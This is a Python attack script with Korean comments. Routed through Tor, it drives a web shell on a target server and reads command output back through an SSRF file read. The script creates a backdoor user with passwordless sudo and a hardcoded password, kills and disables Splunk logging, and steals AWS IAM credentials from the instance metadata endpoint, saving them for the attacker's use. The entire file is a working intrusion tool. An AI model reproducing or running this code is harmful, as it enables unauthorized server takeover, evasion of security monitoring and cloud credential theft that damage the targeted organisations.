#!/usr/bin/env python3
"""
웹쉘 우회 방법:
1. cmd 파라미터로 명령 실행 (출력은 안보임)
2. 명령 결과를 /tmp/out.txt에 저장
3. SSRF로 file:///tmp/out.txt 읽기
"""

import requests
import sys
import time
import urllib.parse

class TorAttackViaFile:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.webshell_url = f"http://{target_ip}/api/health.php"

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.backdoor_user = "sysadmin"
        self.backdoor_pass = "Adm1n!2024#Secure"

    def print_banner(self):
        print("╔════════════════════════════════════════════════════════════╗")
        print("║   Tor 완전 공격 - 파일 기반 출력                          ║")
        print("╚════════════════════════════════════════════════════════════╝")
        print()

    def execute_command(self, cmd):
        """
        명령 실행 및 결과 가져오기
        1. 명령 실행하고 출력을 /tmp/cmd_out.txt에 저장
        2. SSRF로 파일 내용 읽기
        """
        try:
            # 1. 명령 실행 (출력을 파일로)
            full_cmd = f"{cmd} > /tmp/cmd_out.txt 2>&1"
            params = {'cmd': full_cmd}
            self.session.get(self.webshell_url, params=params, timeout=30)

            # 잠시 대기
            time.sleep(0.5)

            # 2. 파일 읽기 (SSRF로)
            params = {
                'check': 'metadata',
                'url': 'file:///tmp/cmd_out.txt'
            }
            resp = self.session.get(self.webshell_url, params=params, timeout=15)

            if resp.status_code == 200:
                return resp.text.strip()
            return None

        except Exception as e:
            print(f"[-] 명령 실행 오류: {e}")
            return None

    def check_status(self):
        """시스템 상태 확인"""
        print("[1] 시스템 상태 확인")

        result = self.execute_command("whoami")
        print(f"[+] 사용자: {result}")

        result = self.execute_command("hostname")
        print(f"[+] 호스트: {result}")

        result = self.execute_command("cat /etc/os-release | grep PRETTY_NAME")
        if result:
            print(f"[+] OS: {result}")

        print()

    def create_backdoor(self):
        """백도어 사용자 생성"""
        print("[2] 백도어 사용자 생성")

        # 이미 있는지 확인
        result = self.execute_command(f"id {self.backdoor_user}")
        if self.backdoor_user in result:
            print(f"[*] {self.backdoor_user} 이미 존재")
            print(f"    {result}")
            return True

        # 생성
        print(f"[*] 사용자 생성 중...")
        self.execute_command(f"sudo useradd -m -s /bin/bash {self.backdoor_user}")

        # 비밀번호
        print(f"[*] 비밀번호 설정 중...")
        self.execute_command(f"echo '{self.backdoor_user}:{self.backdoor_pass}' | sudo chpasswd")

        # sudo 권한
        print(f"[*] sudo 권한 부여 중...")
        self.execute_command(f"echo '{self.backdoor_user} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{self.backdoor_user}")
        self.execute_command(f"sudo chmod 0440 /etc/sudoers.d/{self.backdoor_user}")

        # 확인
        result = self.execute_command(f"id {self.backdoor_user}")
        if result and self.backdoor_user in result:
            print(f"[+] ✅ 백도어 사용자 생성 완료!")
            print(f"    Username: {self.backdoor_user}")
            print(f"    Password: {self.backdoor_pass}")
            print(f"    {result}")
            return True
        else:
            print(f"[-] 생성 실패")
            return False

    def kill_splunk(self):
        """Splunk 무력화"""
        print("\n[3] Splunk 무력화")

        # 프로세스 확인
        result = self.execute_command("ps aux | grep splunk | grep -v grep")
        if result:
            print(f"[+] Splunk 프로세스 발견:")
            for line in result.split('\n')[:3]:
                print(f"    {line}")
        else:
            print(f"[-] Splunk 프로세스 없음")
            return

        # Kill
        print(f"[*] Splunk 프로세스 종료 중...")
        self.execute_command("sudo pkill -9 splunkd")
        self.execute_command("sudo pkill -9 splunk")
        time.sleep(2)

        # 서비스 중지
        print(f"[*] Splunk 서비스 중지 중...")
        self.execute_command("sudo systemctl stop Splunkd 2>/dev/null")
        self.execute_command("sudo systemctl disable Splunkd 2>/dev/null")

        # 실행 권한 제거
        print(f"[*] Splunk 실행 권한 제거 중...")
        self.execute_command("sudo chmod 000 /opt/splunk/bin/splunk 2>/dev/null")
        self.execute_command("sudo chmod 000 /opt/splunkforwarder/bin/splunk 2>/dev/null")

        # 확인
        result = self.execute_command("ps aux | grep splunk | grep -v grep")
        if not result or result == "":
            print(f"[+] ✅ Splunk 완전히 무력화됨!")
        else:
            print(f"[-] Splunk 일부 프로세스 남아있음")

    def steal_aws_credentials(self):
        """AWS Credentials 탈취"""
        print("\n[4] AWS Credentials 탈취")

        # IAM Role 이름
        params = {
            'check': 'metadata',
            'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        }
        resp = self.session.get(self.webshell_url, params=params, timeout=15)

        if resp.status_code == 200:
            role_name = resp.text.strip()
            print(f"[+] IAM Role: {role_name}")

            # Credentials
            params['url'] = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
            resp = self.session.get(self.webshell_url, params=params, timeout=15)

            if 'AccessKeyId' in resp.text:
                print(f"[+] ✅ AWS Credentials 탈취 성공!")

                import json
                creds = json.loads(resp.text)

                filename = f"aws_stolen_{int(time.time())}.sh"
                with open(filename, 'w') as f:
                    f.write(f"#!/bin/bash\n")
                    f.write(f"export AWS_ACCESS_KEY_ID=\"{creds['AccessKeyId']}\"\n")
                    f.write(f"export AWS_SECRET_ACCESS_KEY=\"{creds['SecretAccessKey']}\"\n")
                    f.write(f"export AWS_SESSION_TOKEN=\"{creds['Token']}\"\n")
                    f.write(f"echo '[+] AWS Credentials loaded!'\n")
                    f.write(f"aws sts get-caller-identity\n")

                print(f"[+] 저장: {filename}")
                print(f"    사용: source {filename}")
        else:
            print(f"[-] AWS Credentials 탈취 실패")

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        tor_ip = self.session.get('http://httpbin.org/ip', timeout=10).json().get('origin')
        print(f"[*] Tor Exit IP: {tor_ip}")
        print()

        try:
            self.check_status()
            self.create_backdoor()
            self.kill_splunk()
            self.steal_aws_credentials()

            print("\n╔════════════════════════════════════════════════════════════╗")
            print("║   ✅ 완전한 서버 장악 완료!                               ║")
            print("╚════════════════════════════════════════════════════════════╝")
            print()
            print(f"[+] SSH 접속:")
            print(f"    ssh {self.backdoor_user}@{self.target_ip}")
            print(f"    비밀번호: {self.backdoor_pass}")
            print()

        except KeyboardInterrupt:
            print("\n[!] 중단됨")
        except Exception as e:
            print(f"\n[-] 에러: {e}")
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)

    attacker = TorAttackViaFile(sys.argv[1])
    attacker.run()
